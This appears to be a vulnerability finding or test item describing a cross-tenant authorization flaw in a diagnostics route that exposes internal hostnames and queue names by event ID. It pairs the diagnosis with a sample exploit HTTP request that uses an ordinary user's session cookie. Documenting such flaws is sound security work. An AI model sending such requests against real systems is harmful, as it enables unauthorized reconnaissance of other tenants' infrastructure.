diagnosis: The worker event diagnostics route returns task execution timing, internal server hostnames, and queue names by eventId without checking whether the caller belongs to the tenant that scheduled the task. Any authenticated user can enumerate internal server network topology and queue names across tenants.
exploit_request:
GET /diagnostics/events/evt_worker_task_88194 HTTP/1.1
Host: queue-monitor.internal:8099
Cookie: session_user_id=usr_regular_401
Accept: application/json
